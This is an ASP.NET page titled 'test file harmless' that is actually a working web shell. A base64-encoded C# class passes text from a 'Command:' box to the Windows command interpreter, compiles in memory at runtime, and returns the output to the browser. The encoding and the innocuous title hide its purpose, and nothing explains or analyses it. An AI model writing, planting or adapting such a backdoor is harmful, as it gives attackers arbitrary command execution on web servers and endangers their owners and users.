<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>


<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string update(string arg)
{
    byte[] decoded_request_byte=Convert.FromBase64String("dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5JTzt1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7dXNpbmcgU3lzdGVtLlRleHQ7DQpwdWJsaWMgY2xhc3MgRmVsU2VjDQp7ICAgICAgICAgICAgICAgICAgICANCiAgICBzdHJpbmcgRXhlY0NtZCgpDQogICAgew0KICAgICAgICBQcm9jZXNzU3RhcnRJbmZvIHBpbmZvID0gbmV3IFByb2Nlc3NTdGFydEluZm8oKTsNCiAgICAgICAgcGluZm8uRmlsZU5hbWUgPSBFbnZpcm9ubWVudC5HZXRFbnZpcm9ubWVudFZhcmlhYmxlKCJDb21TcGVjIik7DQogICAgICAgIHBpbmZvLkFyZ3VtZW50cyA9ICIvYyBSRVBMQUNFTUUiOw0KICAgICAgICBwaW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsNCiAgICAgICAgcGluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsNCiAgICAgICAgcGluZm8uVXNlU2hlbGxFeGVjdXRlID0gZmFsc2U7DQogICAgICAgIC8vIHBpbmZvLldvcmtpbmdEaXJlY3RvcnkgPSBFbnZpcm9ubWVudC5HZXRFbnZpcm9ubWVudFZhcmlhYmxlKCJBcHBEYXRhIik7DQogICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7DQogICAgICAgIHRyeXsNCiAgICAgICAgICAgIHAgPSBQcm9jZXNzLlN0YXJ0KHBpbmZvKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpew0KICAgICAgICAgICAgcmV0dXJuICJPaCBubyFcbiIgKyBlOw0KICAgICAgICB9DQogICAgICAgIFN0cmVhbVJlYWRlciBzdG1yZHJfb3V0cHV0ID0gcC5TdGFuZGFyZE91dHB1dDsNCiAgICAgICAgU3RyZWFtUmVhZGVyIHN0bXJkcl9lcnJvcnMgPSBwLlN0YW5kYXJkRXJyb3I7DQogICAgICAgIHN0cmluZyBvdXRwdXQgPSAiIjsNCiAgICAgICAgc3RyaW5nIHN0YW5kX291dCA9IHN0bXJkcl9vdXRwdXQuUmVhZFRvRW5kKCk7DQogICAgICAgIHN0cmluZyBzdGFuZF9lcnJvcnMgPSBzdG1yZHJfZXJyb3JzLlJlYWRUb0VuZCgpOw0KICAgICAgICBzdG1yZHJfb3V0cHV0LkNsb3NlKCk7DQogICAgICAgIHN0bXJkcl9lcnJvcnMuQ2xvc2UoKTsNCiAgICAgICAgaWYgKCFTdHJpbmcuSXNOdWxsT3JFbXB0eShzdGFuZF9vdXQpKQ0KICAgICAgICAgICAgb3V0cHV0ID0gb3V0cHV0ICsgc3RhbmRfb3V0Ow0KICAgICAgICBpZiAoIVN0cmluZy5Jc051bGxPckVtcHR5KHN0YW5kX2Vycm9ycykpDQogICAgICAgICAgICBvdXRwdXQgPSAiT2ggbm8hXG4iICsgb3V0cHV0ICsgc3RhbmRfZXJyb3JzOw0KICAgICAgICByZXR1cm4gb3V0cHV0Ow0KICAgIH0NCiAgICANCiAgICBwdWJsaWMgc3RyaW5nIEV4ZWNSdW50aW1lKCkNCiAgICB7DQogICAgICAgIHN0cmluZyBvdXRwdXRfZnVuYz1FeGVjQ21kKCk7DQogICAgICAgIHJldHVybihvdXRwdXRfZnVuYyk7DQogICAgfQ0KfQ==");
		string runtime_code=Encoding.UTF8.GetString(decoded_request_byte);
        runtime_code=runtime_code.Replace("REPLACEME",arg);
		object runtime_exec_output = new object();
		CompilerResults results = null;
		try{
			CSharpCodeProvider provider = new CSharpCodeProvider();
			CompilerParameters compilerParams = new CompilerParameters();
			compilerParams.GenerateInMemory = true;
			compilerParams.GenerateExecutable = false;
			compilerParams.ReferencedAssemblies.Add("System.dll");	
			results = provider.CompileAssemblyFromSource(compilerParams, runtime_code);
			object o = results.CompiledAssembly.CreateInstance("FelSec");
			MethodInfo mi = o.GetType().GetMethod("ExecRuntime");
			runtime_exec_output = mi.Invoke(o, null);
		}
		catch(Exception exc){
			string exc_out_str = exc.ToString()+"\n\nOh No!";
			for( int i=0; i<results.Errors.Count; i++ )                
				exc_out_str +=  i.ToString() + ": " + results.Errors[i].ToString();
			runtime_exec_output=exc_out_str;
			Response.Clear();
		}
		return (string)runtime_exec_output;
}
void myOut(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(update(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>test file harmless</title>
</HEAD>
<body >
<form id="hmmm" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="go" OnClick="myOut"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
